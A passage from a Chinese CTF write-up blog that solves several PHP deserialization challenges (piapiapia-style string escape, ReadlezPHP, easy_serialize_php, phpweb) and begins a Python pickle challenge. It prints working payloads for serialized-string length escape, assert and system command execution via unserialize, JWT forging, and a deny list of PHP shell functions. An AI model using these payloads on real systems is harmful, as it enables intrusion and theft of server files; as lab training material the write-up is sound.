src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png" alt loading="lazy"></p><p>题目一共四个界面，login，register，update和profile（也就是第一个显示界面）</p><p>前期探测sql注入和文件上传好像都没啥效果，随后扫一下发现存在<a href="http://www.zip源码泄露，代码审计">www.zip源码泄露，代码审计</a></p><p>简单看一下，省略HTML和一些无关部分</p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;]) &#123;        header(&#39;Location: profile.php&#39;);        exit;    &#125;    if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;        $username &#x3D; $_POST[&#39;username&#39;];        $password &#x3D; $_POST[&#39;password&#39;];        if(strlen($username) &lt; 3 or strlen($username) &gt; 16)             die(&#39;Invalid user name&#39;);        if(strlen($password) &lt; 3 or strlen($password) &gt; 16)             die(&#39;Invalid password&#39;);        if($user-&gt;login($username, $password)) &#123;            $_SESSION[&#39;username&#39;] &#x3D; $username;            header(&#39;Location: profile.php&#39;);            exit;            &#125;        else &#123;            die(&#39;Invalid user name or password&#39;);        &#125;    &#125;    else &#123;?&gt;......(html)</code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;        $username &#x3D; $_POST[&#39;username&#39;];        $password &#x3D; $_POST[&#39;password&#39;];        if(strlen($username) &lt; 3 or strlen($username) &gt; 16)             die(&#39;Invalid user name&#39;);        if(strlen($password) &lt; 3 or strlen($password) &gt; 16)             die(&#39;Invalid password&#39;);        if(!$user-&gt;is_exists($username)) &#123;            $user-&gt;register($username, $password);            echo &#39;Register OK!&lt;a href&#x3D;&quot;index.php&quot;&gt;Please Login&lt;&#x2F;a&gt;&#39;;                &#125;        else &#123;            die(&#39;User name Already Exists&#39;);        &#125;    &#125;    else &#123;?&gt;......(html)</code></pre><p>update.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;        die(&#39;Login First&#39;);        &#125;    if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;        $username &#x3D; $_SESSION[&#39;username&#39;];        if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))            die(&#39;Invalid phone&#39;);        if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))            die(&#39;Invalid email&#39;);        if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)            die(&#39;Invalid nickname&#39;);        $file &#x3D; $_FILES[&#39;photo&#39;];        if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)            die(&#39;Photo size error&#39;);        move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));        $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];        $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];        $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname3&#39;];        $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);        $user-&gt;update_profile($username, serialize($profile));        echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;    &#125;    else &#123;?&gt;......(html)&lt;?php    &#125;?&gt;</code></pre><p>profile.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;        die(&#39;Login First&#39;);        &#125;    $username &#x3D; $_SESSION[&#39;username&#39;];    $profile&#x3D;$user-&gt;show_profile($username);    if($profile  &#x3D;&#x3D; null) &#123;        header(&#39;Location: update.php&#39;);    &#125;    else &#123;        $profile &#x3D; unserialize($profile);        $phone &#x3D; $profile[&#39;phone&#39;];        $email &#x3D; $profile[&#39;email&#39;];        $nickname &#x3D; $profile[&#39;nickname&#39;];        $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));?&gt;......(html)&lt;?php    &#125;?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phprequire(&#39;config.php&#39;);class user extends mysql&#123;    private $table &#x3D; &#39;users&#39;;    public function is_exists($username) &#123;        $username &#x3D; parent::filter($username);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        return parent::select($this-&gt;table, $where);    &#125;    public function register($username, $password) &#123;        $username &#x3D; parent::filter($username);        $password &#x3D; parent::filter($password);        $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);        $value_list &#x3D; Array($username, md5($password));        return parent::insert($this-&gt;table, $key_list, $value_list);    &#125;    public function login($username, $password) &#123;        $username &#x3D; parent::filter($username);        $password &#x3D; parent::filter($password);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        $object &#x3D; parent::select($this-&gt;table, $where);        if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function show_profile($username) &#123;        $username &#x3D; parent::filter($username);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        $object &#x3D; parent::select($this-&gt;table, $where);        return $object-&gt;profile;    &#125;    public function update_profile($username, $new_profile) &#123;        $username &#x3D; parent::filter($username);        $new_profile &#x3D; parent::filter($new_profile);        $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;        return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);    &#125;    public function __tostring() &#123;        return __class__;    &#125;&#125;class mysql &#123;    private $link &#x3D; null;    public function connect($config) &#123;        $this-&gt;link &#x3D; mysql_connect(            $config[&#39;hostname&#39;],            $config[&#39;username&#39;],            $config[&#39;password&#39;]        );        mysql_select_db($config[&#39;database&#39;]);        mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);        return $this-&gt;link;    &#125;    public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;        $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;        $result &#x3D; mysql_query($sql, $this-&gt;link);        return mysql_fetch_object($result);    &#125;    public function insert($table, $key_list, $value_list) &#123;        $key &#x3D; implode(&#39;,&#39;, $key_list);        $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;;         $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;        return mysql_query($sql);    &#125;    public function update($table, $key, $value, $where) &#123;        $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;        return mysql_query($sql);    &#125;    public function filter($string) &#123;        $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);        $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;        $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);        $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);        $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;        return preg_replace($safe, &#39;hacker&#39;, $string);    &#125;    public function __tostring() &#123;        return __class__;    &#125;&#125;session_start();$user &#x3D; new user();$user-&gt;connect($config);</code></pre><p>config.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;    $config[&#39;password&#39;] &#x3D; &#39;&#39;;    $config[&#39;database&#39;] &#x3D; &#39;&#39;;    $flag &#x3D; &#39;&#39;;?&gt;</code></pre><p>看最后一个config.php中包含flag，题目要求应该是要我们config.php文件，寻找利用点</p><p>在profile.php中看到有一行代码：</p><pre class="language-php" data-language="php"><code class="language-php">$photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></pre><p>明显的文件读取操作，而在代码上发现有一个反序列化操作</p><pre class="language-php" data-language="php"><code class="language-php">$profile &#x3D; unserialize($profile);</code></pre><p>找到<code>$profile</code>的定义</p><pre class="language-php" data-language="php"><code class="language-php">$profile&#x3D;$user-&gt;show_profile($username);</code></pre><p>跟进<code>show_profile</code>函数</p><pre class="language-php" data-language="php"><code class="language-php">public function show_profile($username) &#123;$username &#x3D; parent::filter($username);$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;$object &#x3D; parent::select($this-&gt;table, $where);return $object-&gt;profile;&#125;</code></pre><p>存在一个对数据库的查询操作，于是寻找数据库写入操作</p><pre class="language-php" data-language="php"><code class="language-php">public function update_profile($username, $new_profile) &#123;$username &#x3D; parent::filter($username);$new_profile &#x3D; parent::filter($new_profile);$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);&#125;</code></pre><p>在找到引用过这个函数的代码，在update.php中</p><pre class="language-php" data-language="php"><code class="language-php">$user-&gt;update_profile($username, serialize($profile));</code></pre><p>可看到存在序列化操作，至此关系以及理清楚</p><p>通过对<code>$profile</code>传入序列化后的字符串再绕过阻碍达到利用<code>file_get_contents</code>读取文件的操作</p><p>再细看代码：</p><pre class="language-php" data-language="php"><code class="language-php">move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname3&#39;];$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);</code></pre><p>$profile是这样定义的结合上面的读取文件操作可知其中的photo变量如果控制令其为config.php即可读取到flag，于是初步payload：</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>反序列化只反到第一个<code>&#125;</code>结束，后面的自动丢弃，但是photo似乎不是我们能够直接控制的，源码中<code>photo= &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code>，也就是说我们不能直接更改photo中的内容了，于是就需要找到序列化后的其它可利用参数再其后写上<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，达到修改的效果，phone，email，nickname都是我们可控的，而phone和email经过了严格的过滤（详情看上面的update.php源码），再来看看nickname：</p><pre class="language-php" data-language="php"><code class="language-php">if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)die(&#39;Invalid nickname&#39;);</code></pre><p><code>nickname[]</code>数组绕过<code>preg_match</code>和<code>strlen</code>即可，两边判断均为<code>false</code>，故不会执行if中的语句，于是再构造payload：</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;aaa&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>到这里是否就已经可以成功读取到文件了呢？并非如此，如果要进行如上的操作，就需要给<code>nickname[]</code>传<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这样的一个值，传入后将会是这个样子</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:34:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>虽然看上去大括号被闭合了，但是要注意到<code>s:34</code>这里，在反序列化的时候进行数据读取的时候依然会读取到引号中的34位字符，就对于没有闭合上，那有该如何利用呢？再接着看代码，</p><p>看看将<code>$profile</code>序列化结果存入数据库时的操作：</p><pre class="language-php" data-language="php"><code class="language-php">public function update_profile($username, $new_profile) &#123;$username &#x3D; parent::filter($username);$new_profile &#x3D; parent::filter($new_profile);$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);&#125;</code></pre><p>可看见对传入的参数进行了处理，跟进父类的<code>filter</code>方法：</p><pre class="language-php" data-language="php"><code class="language-php">public function filter($string) &#123;$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;return preg_replace($safe, &#39;hacker&#39;, $string);&#125;</code></pre><p>可见<code>$string</code>参数经过了两次过滤，第一次等于没用，两次应该都是来防止sql注入的，但这里似乎也不存在sql注入，序列化后的<code>$profile</code>不可能有sql注入风险，而<code>$username</code>的取值来自<code>$_SESSION[&#39;username&#39;]</code>，而<code>username</code>的<code>session</code>是系统分配的，这里也不存在sql注入，所以想想怎么利用在反序列化上面</p><p>这里就涉及到本题的核心了，<strong>反序列化长度逃逸字符</strong></p><p>在php反序列化的守护是根据s后面的值来取字符串长度的，而在<code>filter</code>方法总存在<code>preg_replace</code>替换，如果有<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>其中之一就替换成<code>&#39;hacker&#39;</code>，<code>hacker</code>长度为6位，试想如果替换了里面长度小于6位的字符串，而s后的取值长度发值有没变，那么就会有末尾的字符溢出不会被读取到，而没被读取到的话自然就被当做序列化后的格式处理，再结合这里，改闭合的大括号就可以闭合的上，再看看我们需要逃逸的字符串<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，就是这34位，而替换的字符串中正好一个有比<code>hacker</code>短的字符串<code>where</code>，那么一次就可以逃逸一个出来，那么直接传入34个<code>where</code>就可以将<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>完整的逃逸出来，于是最终<code>payload</code>如下：</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:34:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>令<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>即可</p><p>随后发包：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png" alt loading="lazy"></p><p>查看<code>profile.php</code>网页页面源代码，将图片的base64解可得到<code>config.php</code>的内容，即可得到flag</p><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h3><p>F12后点进去可以看到源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png" alt loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;        $this-&gt;b &#x3D; &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a &#x3D; $this-&gt;a;        $b &#x3D; $this-&gt;b;        echo $b($a);    &#125;&#125;$c &#x3D; new HelloPhp;if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);2020-04-22 10:14:24</code></pre><p>简单的反序列化</p><p><code>__destruct</code>方法在反序列化的时候触发，里面的<code>$b($a)</code>即作为代码执行的条件，于是可以构造<code>assert(phpinfo())</code>，<code>payload</code>如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass HelloPhp&#123;    public $a &#x3D; &#39;phpinfo()&#39;;    public $b &#x3D; &quot;assert&quot;;&#125;$c &#x3D; new HelloPhp();echo serialize($c);</code></pre><p>将结果传入<code>data</code>搜索flag即可得到flag</p><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯-2019-easy_serialize_php"></a>安洵杯-2019-easy_serialize_php</h3><p>题目给出了源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123;    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123;    echo &#39;&lt;a href&#x3D;&quot;..&#x2F;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;    highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;    $userinfo &#x3D; unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;</code></pre><p>在令<code>$function == &#39;phpinfo&#39;</code>时查看<code>phpinfo()</code>内容发现存在<code>d0g3_f1ag.php</code> 文件，推测flag在其中，于是想办法构造文件读取方法</p><p>不难看到代码中有一个<code>extract()</code>函数，这个函数如果没设置<code>extract_rules</code>为<code>EXTR_SKIP</code> 则会覆盖原有变量</p><ul><li><strong>extract()</strong>： 函数从数组中将变量导入到当前的符号表。<a href="https://www.php.net/manual/zh/function.extract.php">参考</a></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200515135141013.png" alt loading="lazy"></p><p>那么我们如果想要读取<code>d0g3_f1ag.php</code>文件的内容就需要令反序列化后的<code>$_SESSION[&#39;img&#39;]</code>为<code>d0g3_f1ag.php  =&gt;  ZDBnM19mMWFnLnBocA==</code>则初步反序列化内容<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>再看到<code>$serialize_info = filter(serialize($_SESSION));</code>，先经过序列化，然后在进行<code>filter</code>函数，也就是过滤替换操作，这样的话就很有可能会造成序列化字符串逃逸的问题，于是构造利用payload：</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[user]&#x3D;flagflagflagflagphpphp&amp;_SESSION[function]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:1:&quot;f&quot;;s:1:&quot;a&quot;;&#125;</code></pre><p>由于<code>_SESSION</code>数组有3个值，则需要在后面补充随便一个值即可</p><p>传入后<code>$serialize_info</code>的就为以下值</p><pre class="language-php" data-language="php"><code class="language-php">a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:34:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; &quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;</code></pre><p><code>user</code>闭合<code>&quot;;s:8:&quot;function&quot;;s:34:</code>，随后再读取<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>，随后大括号闭合，后面的<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>值丢弃</p><p>读取到<code>d0g3_f1ag.php</code> 内容为</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$flag &#x3D; &#39;flag in &#x2F;d0g3_fllllllag&#39;;?&gt;</code></pre><p>再依法读取<code>/d0g3_fllllllag</code>即可</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[user]&#x3D;flagflagflagflagphpphp&amp;_SESSION[function]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;f&quot;;s:1:&quot;a&quot;;&#125;</code></pre><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>题目每隔一段时间都会自动发一个包刷新一下网页，抓包下来看看发来了啥数据</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625154555825.png" alt loading="lazy"></p><p>测试后报错得到函数调用了<code>call_user_func()</code>函数，该函数把第一个参数作为回调函数调用，也就是说这个数据包调用了date函数，传入了后面为p的参数，并且执行了函数输出了结果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155114637.png" alt loading="lazy"></p><p>于是用<code>system</code>函数测试命令执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155200767.png" alt loading="lazy"></p><p>被过滤了，于是直接将<code>index.php</code>的源码读取出来(读根目录没有flag)，<code>func=readfile&amp;p=index.php</code>，得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result &#x3D; call_user_func($func, $p);    $a&#x3D; gettype($result);    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;    var $func &#x3D; &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func &#x3D; $_REQUEST[&quot;func&quot;];$p &#x3D; $_REQUEST[&quot;p&quot;];if ($func !&#x3D; null) &#123;    $func &#x3D; strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>果不其然过滤了很多命令执行的函数，用的<code>in_array</code>函数进行对比，但是可以看到改函数的<code>Test</code>方法，里面也调用了<code>gettime</code>方法，于是构造反序列化利用</p><p>exp：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Test &#123;    public $p &#x3D; &quot;find &#x2F; -name *flag*&quot;;    public $func &#x3D; &quot;system&quot;;&#125;$b &#x3D; new Test();echo serialize($b);O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:19:&quot;find &#x2F; -name *flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><p>传入找到flag所在的文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155712200.png" alt loading="lazy"></p><p>尝试读取</p><pre class="language-php" data-language="php"><code class="language-php">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><p>得到flag</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="CISCN2019-华北赛区-Day1-Web2—ikun"><a href="#CISCN2019-华北赛区-Day1-Web2—ikun" class="headerlink" title="CISCN2019-华北赛区-Day1-Web2—ikun"></a>CISCN2019-华北赛区-Day1-Web2—ikun</h3><p>根据题目提示需要买到lv6的账号，于是写脚本找</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4882ba34-0c83-48c1-b876-e1b21efa6a68.node3.buuoj.cn&#x2F;shop?page&#x3D;&#123;&#125;&quot;for i in range(1000):    a &#x3D; requests.get(url.format(i))    if &quot;static&#x2F;img&#x2F;lv&#x2F;lv6.png&quot; in a.text:        print(url.format(i))</code></pre><p>跑出lv6在<code>page=181</code>的页面，点击购买钱不够，发现有折扣，于是抓包改折扣为0.0000001，随后提示需要是<code>admin</code>，抓包注意到有一个<code>jwt</code>的<code>cookie</code>，<a href="https://www.jianshu.com/p/576dbf44b2ae">参考</a>，这里有一个编解码<a href="https://jwt.io/#debugger-io">网站</a>，再找到爆破密钥脚本<a href="https://github.com/brendan-rius/c-jwt-cracker">网站</a>，跑出来密钥为<code>1kun</code>，放到编码网站编码后携带这个<code>jwt</code>的<code>cookie</code>发包，随后来到<code>b1g_m4mber</code>界面，查看源码得到<code>www.zip</code>源码包，找到关键利用的代码</p><pre class="language-python" data-language="python"><code class="language-python">import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user &#x3D;&#x3D; &quot;admin&quot;:            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)        else:            return self.render(&#39;no_ass.html&#39;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become &#x3D; self.get_argument(&#39;become&#39;)            p &#x3D; pickle.loads(urllib.unquote(become))            return self.render(&#39;form.html&#39;, res&#x3D;p, member&#x3D;1)        except:            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, 